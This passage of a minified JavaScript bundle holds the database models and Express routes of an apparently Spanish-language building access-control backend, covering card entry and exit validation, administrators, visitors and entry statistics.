edula"}},tipo_id:{type:s.INTEGER,allowNull:!1,references:{model:n,key:"id"}},carrera_id:{type:s.INTEGER,allowNull:!0,references:{model:i,key:"id"}},abscripcion_id:{type:s.INTEGER,allowNull:!0,references:{model:o,key:"id"}}},{timestamps:!1,tableName:"tarjetas"});d.belongsTo(i,{foreignKey:"carrera_id"}),d.belongsTo(n,{foreignKey:"tipo_id"}),d.belongsTo(o,{foreignKey:"abscripcion_id"}),e.exports=d},295:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321).define("Tipo",{id:{type:s.INTEGER,primaryKey:!0,autoIncrement:!0},nombre:{type:s.STRING,allowNull:!1}},{timestamps:!1,tableName:"tipos"});e.exports=r},618:(e,t,a)=>{const{DataTypes:s}=a(496),r=a(321),o=a(238),i=r.define("Usuario",{cedula:{type:s.INTEGER,primaryKey:!0},nombres:{type:s.STRING,allowNull:!1},apellidos:{type:s.STRING,allowNull:!1},detalles:{type:s.TEXT,allowNull:!0},correo:{type:s.STRING,allowNull:!0},telefono:{type:s.NUMBER,allowNull:!0},avatar:{type:s.BLOB},estatus:{type:s.ENUM("1","0"),defaultValue:"1"}},{timestamps:!1,tableName:"usuarios"});i.hasMany(o,{foreignKey:"cedula"}),o.belongsTo(i,{foreignKey:"cedula"}),e.exports=i},14:(e,t,a)=>{const s=a(860),r=a(672),{permisos:o,permisos_administrador:i,crear_administrador:n,todos_administradores:c,cambiar_estado:d,crear:u,mis_permisos:l}=a(340),p=s.Router();p.get("/permisos",o),p.get("/permisos_administrador",i),p.post("/crear_administrador",n),p.get("/administradores/todos_administradores",c),p.get("/administradores/cambiar_estado/:administrador_id",r,d),p.get("/administradores/mis_permisos",r,l),p.post("/administradores/:tipo",r,u),e.exports=p},866:(e,t,a)=>{const s=a(860),{login:r}=a(93),o=s.Router();o.post("/login",r),e.exports=o},279:(e,t,a)=>{const s=a(860),r=a(672),{validar_tarjeta_entrada:o,validar_tarjeta_salida:i,historial:n,entrar_salir:c,personas_edificio:d,ingresaron_salieron_hoy:u,estadisticas_ingreso_hora:l}=a(631),p=s.Router();p.get("/control-acceso/validar-entrada/:iCardCode",o),p.get("/control-acceso/validar-salida/:iCardCode",i),p.get("/control-acceso/:tipo_acceso/:cedula/:tipo_id",r,c),p.get("/control-acceso/estadisticas_ingreso_hora",r,l),p.get("/personas_edificio",r,d),p.get("/ingresaron_salieron_hoy/:tipo_acceso",r,u),p.post("/historial",r,n),e.exports=p},454:(e,t,a)=>{const s=a(860),r=a(672),{ingresos_usuarios_agregar:o,ingresos_usuarios_desagregar:i}=a(621),n=s.Router();n.post("/estadisticas/usuarios/agregar",r,o),n.post("/estadisticas/usuarios/desagregar",r,i),e.exports=n},388:(e,t,a)=>{const s=a(860),r=a(672),{obtener_estadisticas_entrada:o,ingresos_grafico:i,ingresos_por_tipo_general:n,ingresos_por_tipo_detallado:c,ingresos_por_carrera_general:d,ingresos_por_carrera_detallado:u,ingresos_personalizado:l}=a(688),p=s.Router();p.post("/panel/obtener_estadisticas_entrada",r,o),p.post("/panel/ingresos_grafico",r,i),p.post("/panel/ingresos_por_tipo_general",r,n),p.post("/panel/ingresos_por_tipo_detallado",r,c),p.post("/panel/ingresos_por_carrera_general",r,d),p.post("/panel/ingresos_por_carrera_detallado",r,u),p.post("/panel/ingresos_personalizado",r,l),e.exports=p},456:(e,t,a)=>{const s=a(860),{todos_usuarios:r,usuarios:o,visitantes:i,visitante_crear:n,visitante_actualizar:c,historial_usuario_particular:d,cambiar_estado:u,actualizar_informacion:l}=a(873),p=a(672),m=s.Router();m.get("/todos_usuarios",p,r),m.get("/usuarios",p,o),m.post("/usuarios/historial_usuario_particular",p,d),m.get("/usuarios/cambiar_estado/:cedula",p,u),m.post("/usuarios/actualizar/informacion",p,l),m.get("/visitantes",p,i),m.post("/visitantes/crear",p,n),m.post("/visitantes/actualizar",p,c),e.exports=m},167:e=>{"use strict";e.exports=require("axios")},96:e=>{"use strict";e.exports=require("bcrypt")},582:e=>{"use strict";e.exports=require("cors")},142:e=>{"use strict";e.exports=require("dotenv")},860:e=>{"use strict";e.exports=require("express")},77:e=>{"use strict";e.exports=require("ip")},344:e=>{"use strict";e.exports=require("jsonwebtoken")},245:e=>{"use strict";e.exports=require("moment")},496:e=>{"use strict";e.exports=require("sequelize")},952:e=>{"use strict";e.exports=require("socket.io")},685:e=>{"use strict";e.exports=require("http")},17:e=>{"use strict";e.exports=require("path")}},t={};!function a(s){var r=t[s];if(void 0!==r)return r.exports;var o=t[s]={exports:{}};return e[s](o,o.exports,a),o.exports}(138)})();